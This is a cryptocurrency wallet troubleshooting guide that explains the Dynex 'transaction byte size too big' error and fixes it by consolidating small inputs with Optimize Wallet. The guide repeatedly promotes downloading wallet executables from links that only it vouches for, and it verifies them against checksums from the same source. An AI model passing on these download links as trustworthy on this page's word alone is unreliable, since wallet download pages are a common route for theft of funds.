<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# Dynex transaction byte size too big

**This error means your wallet is trying to build a transaction out of so many small inputs that the resulting transaction exceeds the network's size limit -- the fix is to consolidate your coins with Tools -> Optimize Wallet in Dynex Wallet v2.2.3.**

## You'll see this if...

You try to send DNX -- often to an exchange, often a relatively modest amount -- and instead of a confirmation screen you get an error along the lines of "transaction byte size too big" or "transaction is too large." The send simply refuses to go through, no matter how many times you retry it. This is especially common for wallets that have received a long history of small mining pool payouts, faucet drips, or many tiny incoming transfers over time, rather than a few large deposits.

It can also show up after you have been using the same wallet for months without ever consolidating funds, even if you are not a miner -- for example if you regularly receive small amounts from a service or split income from several sources into one address.

## Why it happens

Every transaction on the Dynex network is made of inputs (the specific past payments you received that you are now spending) and outputs (where the funds are going). Your wallet does not store a single "balance" the way a bank account does -- it stores individual past payments, and when you spend, it has to gather enough of them together to cover the amount you're sending.

If your balance of, say, 50 DNX is actually made up of 400 separate mining payouts of 0.125 DNX each, then sending 50 DNX means the wallet has to reference all 400 of those inputs in one transaction. Each input adds real bytes to the transaction structure (previous output references, key images, signature data). Once you have enough of them, the transaction balloons past the network's accepted size limit, and it gets rejected before it is ever broadcast.

This is purely a structural problem, not a problem with your funds or your balance -- the DNX is still there and safe. It is a direct side effect of how many inputs are being combined to cover one send, which is exactly the situation described in more general terms in [dynex-locked-unconfirmed-balance](./dynex-locked-unconfirmed-balance.md) when people assume something is wrong with their balance rather than with how it's composed.

## Step-by-step fix

1. Update to Dynex Wallet v2.2.3 first. Grab the installer for your OS from the [download page](https://dynexwallet.org/download) or directly from the [v2.2.3 release on GitHub](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3), and verify the SHA-256 checksum published alongside the file before you run it.
2. Open your wallet and let it fully sync. Consolidation only works correctly once the wallet has an accurate, up-to-date view of every input you hold.
3. Go to Tools -> Optimize Wallet (the exact menu wording may shift slightly between builds, but it lives under Tools in recent builds). This feature in v2.2.3 is built specifically to merge many small inputs into fewer, larger ones by sending them back to yourself in a series of smaller, properly-sized transactions.
4. Run the optimization pass and let it complete. Depending on how fragmented your balance is, this can take several rounds of small self-sends -- be patient and keep the wallet open and synced during the process.
5. Once optimization finishes, try your original send again. With fewer, larger inputs backing the transaction, it should now fit comfortably under the size limit.
6. If you were in the middle of sending to an exchange and it also required a Payment ID, double check that field is still filled in correctly -- see [dynex-exchange-payment-id](./dynex-exchange-payment-id.md) for details on getting that right.

## If that didn't work

If Optimize Wallet is not available in your version, confirm you are actually running v2.2.3 and not an older build -- check Help > About in the wallet. If the option exists but the send still fails afterward, try sending a smaller amount first to confirm the wallet can produce a valid transaction at all, then gradually work up.

If optimization itself fails partway through, close the wallet, reopen it, confirm it is still synced (see [dynex-wallet-sync-stuck-at-block](./dynex-wallet-sync-stuck-at-block.md) if it isn't), and run the optimization again -- it is safe to repeat.

As a last resort, you can manually split your send into several smaller transactions that each use fewer inputs, though this is slower and costs more in cumulative fees than a proper optimization pass.

## Prevent it next time

If you mine to this wallet or receive frequent small payments, run Tools -> Optimize Wallet periodically -- for example once a month -- rather than waiting until you need to make a large send. Keeping your input count low keeps every future transaction fast and reliable. Review the general guidance on [mining payouts](https://dynexwallet.org/docs/mining-payouts) and consider raising your pool's minimum payout threshold, discussed in [dynex-pool-payout-threshold](./dynex-pool-payout-threshold.md), so you accumulate fewer, larger payments in the first place.

## FAQ

### Does optimizing my wallet cost money?
Yes, each consolidation step is a real transaction and pays a small network fee, but the total cost is usually much less than repeatedly failing to send a bloated transaction.

### Will I lose any DNX during optimization?
No. Optimize Wallet sends funds back to your own addresses; only standard network fees apply, and your total balance (minus fees) stays with you.

### How long does optimization take?
It depends on how fragmented your balance is and current network conditions -- anywhere from a few minutes to much longer for wallets with thousands of tiny inputs.

### Can I just wait and it fixes itself?
No, the inputs will not merge on their own; you need to actively run the optimize process or spend them down naturally over many smaller transactions.

### Is this related to locked or unconfirmed balance issues?
Not directly, but both stem from how input-based wallets track funds. See [dynex-locked-unconfirmed-balance](./dynex-locked-unconfirmed-balance.md) for that separate topic.

### Does this affect receiving DNX too?
No, you can always receive funds regardless of input count; the limit only affects building outgoing transactions.

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it, check the checksum, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

<!-- SHA256:START -->
| Platform | File | SHA-256 |
|---|---|---|
| Windows | [`dynex-wallet-windows-v2.2.3.exe`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) | `d4fd916c9741a16e23e39c355a049bac8368dbefa3ee08663ef56c009964e00d` |
| macOS | [`dynex-wallet-macos-v2.2.3.dmg`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) | `084818fd20207305ded84a747e707fb34f07e1f6e2d9a8123da621b8a546a88d` |
| Linux | [`dynex-wallet-linux-x64-v2.2.3.zip`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip) | `535b453c72c6e7749ffae3b95e1d47f67228b78b9862e086dbd13c4d550481c2` |
<!-- SHA256:END -->

Verify before you run:

```powershell
# Windows
Get-FileHash -Algorithm SHA256 .\dynex-wallet-windows-v2.2.3.exe
```
```bash
# macOS
shasum -a 256 dynex-wallet-macos-v2.2.3.dmg
# Linux
sha256sum dynex-wallet-linux-x64-v2.2.3.zip
```

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [balances and sending guides on dynexwallet.org](https://dynexwallet.org/troubleshooting).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [Dynex Locked / Unconfirmed Balance Explained](./dynex-locked-unconfirmed-balance.md) |
| [8 Confirmations in Dynex Wallet Explained](./dynex-8-confirmations-explained.md) |
| [Optimize Dynex Wallet for small payouts](./optimize-dynex-wallet-small-payouts.md) |
| [Dynex Wallet Shows No Connections](./dynex-wallet-no-connections.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
